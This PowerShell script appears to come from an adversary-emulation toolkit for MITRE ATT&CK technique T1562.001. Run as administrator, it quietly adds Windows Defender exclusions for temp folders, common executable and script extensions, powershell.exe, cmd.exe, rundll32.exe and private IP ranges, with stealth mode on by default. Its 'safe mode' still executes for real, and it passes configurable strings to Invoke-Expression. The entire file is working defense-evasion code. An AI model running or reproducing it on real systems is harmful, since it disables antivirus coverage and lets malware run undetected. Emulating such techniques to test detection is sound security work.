# T1562.001D - MITRE ATT&CK Impair Defenses: Add Windows Defender Exclusions
# Tactic: TA0005 Defense Evasion - Specific Defender Exclusions addition only
# Package Type: inject - Active system modification (single atomic action)
# Script Length: ~130 lines (atomic focus)
# Functions: 5 infrastructure + 4 triple output + 1 technique function

#Requires -Version 3.0
#Requires -RunAsAdministrator


function Get-EnvironmentVariables {
    $config = @{
        # Variables de base
        OUTPUT_BASE = if ($env:T1562_001_OUTPUT_BASE) { $env:T1562_001_OUTPUT_BASE } else { "C:\temp\mitre_results" }
        DEBUG_MODE = if ($env:T1562_001_DEBUG_MODE) { $env:T1562_001_DEBUG_MODE -eq "true" } else { $false }
        STEALTH_MODE = if ($env:T1562_001_STEALTH_MODE) { $env:T1562_001_STEALTH_MODE -eq "true" } else { $true }
        SAFE_MODE = if ($env:T1562_001_SAFE_MODE) { $env:T1562_001_SAFE_MODE -eq "true" } else { $false }
        
        # Variables sp cifiques Exclusions
        EXCLUSION_PATHS = if ($env:T1562_001_EXCLUSION_PATHS) { $env:T1562_001_EXCLUSION_PATHS } else { "C:\temp,C:\users\public,C:\windows\temp" }
        EXCLUSION_EXTENSIONS = if ($env:T1562_001_EXCLUSION_EXTENSIONS) { $env:T1562_001_EXCLUSION_EXTENSIONS } else { ".exe,.dll,.ps1,.bat,.tmp" }
        EXCLUSION_PROCESSES = if ($env:T1562_001_EXCLUSION_PROCESSES) { $env:T1562_001_EXCLUSION_PROCESSES } else { "powershell.exe,cmd.exe,rundll32.exe" }
        EXCLUSION_IPS = if ($env:T1562_001_EXCLUSION_IPS) { $env:T1562_001_EXCLUSION_IPS } else { "192.168.1.0/24,10.0.0.0/8" }
        VERIFY_EXCLUSIONS = if ($env:T1562_001_VERIFY_EXCLUSIONS) { $env:T1562_001_VERIFY_EXCLUSIONS -eq "true" } else { $true }
    }
    
    return $config
}

function Initialize-OutputStructure {
    param([string]$OutputBase, [string]$TechniqueId)
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputDir = Join-Path $OutputBase "${TechniqueId}_${timestamp}"
    
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    return $outputDir
}

function Write-JsonOutput {
    param([hashtable]$Data, [string]$OutputPath, [hashtable]$Metadata)
    
    $jsonOutput = @{
        technique_id = $Metadata.technique_id
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        results = $Data
        system_context = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
        }
    }
    
    $jsonOutput | ConvertTo-Json -Depth 5 | Out-File -FilePath $OutputPath -Encoding UTF8
}

function Get-ExecutionMetadata {
    param([string]$TechniqueId, [string]$Action)
    
    return @{
        technique_id = $TechniqueId
        action = $Action
        timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        hostname = $env:COMPUTERNAME
    }
}

function Invoke-SafeCommand {
    param([string]$Command, [hashtable]$Config, [string]$Description = "")
    
    if ($Config.SAFE_MODE) {
        if (-not $Config.STEALTH_MODE) {
            Write-Host "[SAFE MODE - REAL EXECUTION] Executing: $Description" -ForegroundColor Yellow
        }
    }
    
    try {
        $result = Invoke-Expression $Command 2>&1
        return @{ success = $true; output = $result }
    }
    catch {
        return @{ success = $false; output = $_.Exception.Message }
    }
}


function Write-SimpleOutput {
    param([hashtable]$Results, [hashtable]$Config)
    
    if ($Config.STEALTH_MODE) { return }
    
    Write-Host "T1562.001D DEFENDER EXCLUSIONS ADDED " -ForegroundColor Red
    Write-Host "Path Exclusions: $($Results.path_exclusions_added)" -ForegroundColor Green
    Write-Host "Extension Exclusions: $($Results.extension_exclusions_added)" -ForegroundColor Green
    Write-Host "Process Exclusions: $($Results.process_exclusions_added)" -ForegroundColor Green
    Write-Host "IP Exclusions: $($Results.ip_exclusions_added)" -ForegroundColor Green
}

function Write-DebugOutput {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Metadata, [hashtable]$Config)
    
    if ($Config.DEBUG_MODE) {
        $debugFile = Join-Path (Split-Path $OutputPath) "debug_exclusions.json"
        Write-JsonOutput -Data $Results -OutputPath $debugFile -Metadata $Metadata
    }
}

function Write-StealthOutput {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Config)
    
    if ($Config.STEALTH_MODE) {
        $stealthFile = Join-Path (Split-Path $OutputPath) "exclusions.log"
        "T1562.001D executed at $(Get-Date)" | Out-File -FilePath $stealthFile -Append
    }
}

function Select-OutputMode {
    param([hashtable]$Results, [string]$OutputPath, [hashtable]$Metadata, [hashtable]$Config)
    
    Write-SimpleOutput -Results $Results -Config $Config
    Write-DebugOutput -Results $Results -OutputPath $OutputPath -Metadata $Metadata -Config $Config
    Write-StealthOutput -Results $Results -OutputPath $OutputPath -Config $Config
}


# TECHNIQUE-SPECIFIC FUNCTION (ATOMIC ACTION)


function Add-DefenderExclusions {
    param([hashtable]$Config)
    
    $results = @{
        path_exclusions_added = 0
        extension_exclusions_added = 0
        process_exclusions_added = 0
        ip_exclusions_added = 0
        exclusions_verified = $false
        errors = @()
    }
    
    # 1. Add Path Exclusions
    $exclusionPaths = $Config.EXCLUSION_PATHS -split ','
    foreach ($path in $exclusionPaths) {
        $pathTrimmed = $path.Trim()
        $cmd = "Add-MpPreference -ExclusionPath '$pathTrimmed'"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Adding path exclusion: $pathTrimmed"
        
        if ($result.success) {
            $results.path_exclusions_added++
        } else {
            $results.errors += "Path exclusion failed for $pathTrimmed : $($result.output)"
        }
    }
    
    # 2. Add Extension Exclusions
    $exclusionExts = $Config.EXCLUSION_EXTENSIONS -split ','
    foreach ($ext in $exclusionExts) {
        $extTrimmed = $ext.Trim()
        $cmd = "Add-MpPreference -ExclusionExtension '$extTrimmed'"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Adding extension exclusion: $extTrimmed"
        
        if ($result.success) {
            $results.extension_exclusions_added++
        } else {
            $results.errors += "Extension exclusion failed for $extTrimmed : $($result.output)"
        }
    }
    
    # 3. Add Process Exclusions
    $exclusionProcs = $Config.EXCLUSION_PROCESSES -split ','
    foreach ($proc in $exclusionProcs) {
        $procTrimmed = $proc.Trim()
        $cmd = "Add-MpPreference -ExclusionProcess '$procTrimmed'"
        $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Adding process exclusion: $procTrimmed"
        
        if ($result.success) {
            $results.process_exclusions_added++
        } else {
            $results.errors += "Process exclusion failed for $procTrimmed : $($result.output)"
        }
    }
    
    # 4. Add IP Exclusions (if configured)
    if ($Config.EXCLUSION_IPS -and $Config.EXCLUSION_IPS -ne "") {
        $exclusionIPs = $Config.EXCLUSION_IPS -split ','
        foreach ($ip in $exclusionIPs) {
            $ipTrimmed = $ip.Trim()
            $cmd = "Add-MpPreference -ExclusionIpAddress '$ipTrimmed'"
            $result = Invoke-SafeCommand -Command $cmd -Config $Config -Description "Adding IP exclusion: $ipTrimmed"
            
            if ($result.success) {
                $results.ip_exclusions_added++
            } else {
                $results.errors += "IP exclusion failed for $ipTrimmed : $($result.output)"
            }
        }
    }
    
    # 5. Verify Exclusions (if configured)
    if ($Config.VERIFY_EXCLUSIONS) {
        $verifyCmd = 'Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess, ExclusionIpAddress'
        $verifyResult = Invoke-SafeCommand -Command $verifyCmd -Config $Config -Description "Verifying exclusions"
        
        if ($verifyResult.success) {
            $results.exclusions_verified = $true
            $results.current_exclusions = $verifyResult.output
        }
    }
    
    return $results
}


# MAIN EXECUTION


try {
    $config = Get-EnvironmentVariables
    $metadata = Get-ExecutionMetadata -TechniqueId "T1562.001d" -Action "add_defender_exclusions"
    $outputDir = Initialize-OutputStructure -OutputBase $Config.OUTPUT_BASE -TechniqueId $metadata.technique_id
    
    $results = Add-DefenderExclusions -Config $config
    
    $outputFile = Join-Path $outputDir "defender_exclusions_results.json"
    Select-OutputMode -Results $results -OutputPath $outputFile -Metadata $metadata -Config $config
    
} catch {
    if (-not $Config.STEALTH_MODE) {
        Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
    }
    exit 1
}


